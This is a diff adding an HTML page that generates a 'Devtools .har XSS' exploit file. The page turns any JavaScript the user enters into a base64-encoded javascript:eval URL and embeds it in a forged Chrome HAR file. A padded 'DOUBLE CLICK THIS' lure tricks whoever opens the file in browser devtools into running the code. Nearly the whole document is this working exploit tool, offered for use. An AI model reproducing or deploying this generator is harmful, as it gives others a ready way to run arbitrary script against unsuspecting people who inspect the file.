@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Devtools .har XSS Generator</title>
+</head>
+<body>
+  <h1>Devtools .har XSS Generator</h1>
+  <p>XSS found by crossjbly, site by Blobby Boi. IF ANYONE ELSE CLAIMS THEY MADE THIS SITE, THEY DIDN'T!!!!</p>
+
+  <textarea id="jsInput" placeholder="Enter JavaScript code here" rows="10" cols="80"></textarea><br>
+  <button onclick="generateHar()">Generate .har file</button>
+
+  <script>
+  function escapeForJsonString(str) {
+    return str
+      .replace(/\\/g, '\\\\')
+      .replace(/"/g, '\\"')
+      .replace(/\u0000/g, '\\u0000')
+      .replace(/\n/g, '\\n')
+      .replace(/\r/g, '\\r')
+      .replace(/\t/g, '\\t')
+      .replace(/\f/g, '\\f')
+      .replace(/\b/g, '\\b')
+      .replace(/</g, '\\u003C')
+      .replace(/>/g, '\\u003E')
+      .replace(/&/g, '\\u0026')
+      .replace(/'/g, '\\u0027');
+  }
+
+  function generateHar() {
+    const inputCode = document.getElementById('jsInput').value.trim();
+    if (!inputCode) {
+      alert('Bro didnt type any code');
+      return;
+    }
+
+    const now = new Date().toISOString();
+    const base64Code = btoa(unescape(encodeURIComponent(inputCode)));
+    const bookmarkletUrl = `javascript:eval(atob('${base64Code}'))`;
+    const escapedInputCode = escapeForJsonString(inputCode);
+
+    const har = {
+      log: {
+        version: "1.2",
+        creator: {
+          name: "WebInspector",
+          version: "537.36"
+        },
+        pages: [
+          {
+            startedDateTime: now,
+            id: "page_1",
+            title: bookmarkletUrl,
+            pageTimings: {
+              onContentLoad: 57.19,
+              onLoad: 57.77
+            }
+          }
+        ],
+        entries: [
+          {
+            _connectionId: "16771",
+            _initiator: {
+              type: "script",
+              stack: {
+                callFrames: [
+                  {
+                    functionName: "",
+                    scriptId: "9",
+                    url: "",
+                    lineNumber: 11,
+                    columnNumber: 4
+                  }
+                ]
+              }
+            },
+            _priority: "High",
+            _resourceType: "fetch",
+            cache: {},
+            connection: "443",
+            pageref: "page_1",
+            request: {
+              method: "GET",
+              url: bookmarkletUrl + '//' + ' '.repeat(20) + 'DOUBLE CLICK THIS',
+              httpVersion: "h3",
+              headers: [
+                { name: ":authority", value: "" },
+                { name: ":method", value: "GET" },
+                { name: ":path", value: bookmarkletUrl },
+                { name: ":scheme", value: "javascript" },
+                { name: "accept", value: "*/*" },
+                { name: "user-agent", value: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" }
+              ],
+              queryString: [],
+              cookies: [],
+              headersSize: -1,
+              bodySize: 0
+            },
+            response: {
+              status: 200,
+              statusText: "",
+              httpVersion: "h3",
+              headers: [
+                { name: "content-type", value: "application/javascript; charset=utf-8" }
+              ],
+              cookies: [],
+              content: {
+                size: inputCode.length,
+                mimeType: "application/javascript",
+                text: escapedInputCode
+              },
+              redirectURL: "",
+              headersSize: -1,
+              bodySize: -1
+            },
+            serverIPAddress: "0.0.0.0",
+            startedDateTime: now,
+            time: 100,
+            timings: {
+              blocked: 0,
+              dns: 0,
+              ssl: 0,
+              connect: 0,
+              send: 0,
+              wait: 50,
+              receive: 50,
+              _blocked_queueing: 0
+            }
+          }
+        ]
+      }
+    };
+
+    const blob = new Blob([JSON.stringify(har, null, 2)], { type: "application/json" });
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = 'script.har';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+  }
+  </script>
+</body>
+</html>
